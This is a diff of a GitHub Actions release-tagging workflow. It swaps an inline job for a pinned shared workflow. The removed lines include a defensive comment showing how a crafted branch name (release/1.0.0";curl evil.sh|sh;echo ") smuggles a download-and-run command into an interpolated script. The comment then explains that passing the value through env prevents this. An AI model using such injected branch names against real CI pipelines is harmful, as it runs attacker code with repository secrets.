@@ -1,3 +1,6 @@
+# Caller of the shared tag workflow. Merged release/X.Y.Z PR → annotated vX.Y.Z.
+# Never tag by hand.
+
 name: Tag Release
 
 on:
@@ -7,84 +10,6 @@ on:
 
 jobs:
   tag:
-    if: >
-      github.event.pull_request.merged == true &&
-      startsWith(github.event.pull_request.head.ref, 'release/')
-    runs-on: ubuntu-latest
-    steps:
-      # HEAD_REF is passed through `env:`, never interpolated into the script.
-      #
-      # A `${{ }}` expression is substituted into the script TEXT before bash
-      # parses it, so an attacker-chosen branch name becomes shell code rather
-      # than a shell string. Git permits `;`, `"`, `$`, `(`, `)` and backticks
-      # in ref names, so `release/1.0.0";curl evil.sh|sh;echo "` is a valid
-      # branch, and interpolating it here would run that command.
-      #
-      # The regex below cannot prevent that: it executes after the injected
-      # code has already run. Validation never protects an interpolation —
-      # only not interpolating does. Read through `$HEAD_REF` instead and the
-      # value is data the shell looks up at runtime, whatever it contains.
-      - name: Derive version from branch name
-        id: version
-        env:
-          HEAD_REF: ${{ github.event.pull_request.head.ref }}
-        run: |
-          version="${HEAD_REF#release/}"
-          if [[ ! "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-            echo "::error::Branch '$HEAD_REF' is not a valid release/X.Y.Z branch"
-            exit 1
-          fi
-          # Safe to write unquoted only because the anchored regex above has
-          # already restricted $version to digits and dots — a newline here
-          # would otherwise let it forge extra step outputs.
-          echo "tag=v$version" >> "$GITHUB_OUTPUT"
-
-      - name: Create release tag
-        env:
-          GH_TOKEN: ${{ secrets.RELEASE_TAG_TOKEN }}
-          # Same treatment for consistency. These are GitHub-controlled
-          # (a repo slug, a validated tag, a 40-hex SHA, a PR URL) rather than
-          # attacker-controlled, but keeping every expression out of the
-          # script body means a reader never has to work out which is which.
-          REPO: ${{ github.repository }}
-          TAG: ${{ steps.version.outputs.tag }}
-          MERGE_SHA: ${{ github.event.pull_request.merge_commit_sha }}
-          PR_URL: ${{ github.event.pull_request.html_url }}
-        run: |
-          if [ -z "$GH_TOKEN" ]; then
-            echo "::error::RELEASE_TAG_TOKEN secret is not set on this repo/org — cannot create release tag."
-            exit 1
-          fi
-
-          # POST git/refs alone creates a *lightweight* tag: a ref pointing
-          # straight at the commit, with no tag object behind it. `git
-          # describe` without --tags only walks annotated tags, so a
-          # lightweight tag here is invisible to it (and to anything else
-          # that assumes release tags are annotated). An annotated tag is
-          # its own object — tagger, date, message — that the ref then
-          # points to, so it has to be created first via git/tags.
-          #
-          # Not signed: GPG/SSH signing needs a private key available to
-          # the Actions runner, which isn't set up. The unsigned annotated
-          # tag object is still real Git metadata and fixes `git describe`;
-          # signing can be layered on later if the key management exists.
-          MESSAGE=$(printf 'Release %s\n\n%s' "$TAG" "$PR_URL")
-          TAG_SHA=$(jq -n \
-            --arg tag "$TAG" \
-            --arg message "$MESSAGE" \
-            --arg object "$MERGE_SHA" \
-            --arg name "github-actions[bot]" \
-            --arg email "support@edgefirst.ai" \
-            --arg date "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
-            '{tag: $tag, message: $message, object: $object, type: "commit",
-              tagger: {name: $name, email: $email, date: $date}}' \
-            | gh api "repos/${REPO}/git/tags" --input - --jq '.sha')
-
-          if [ -z "$TAG_SHA" ]; then
-            echo "::error::Failed to create annotated tag object for ${TAG}."
-            exit 1
-          fi
-
-          gh api "repos/${REPO}/git/refs" \
-            -f ref="refs/tags/${TAG}" \
-            -f sha="${TAG_SHA}"
+    if: github.event.pull_request.merged == true && startsWith(github.event.pull_request.head.ref, 'release/')
+    uses: EdgeFirstAI/.github/.github/workflows/tag-release.yml@fd38981b2b94ae195801a21660e9ccc3fb222a4a  # EDGEAI-1554 pre-command
+    secrets: inherit
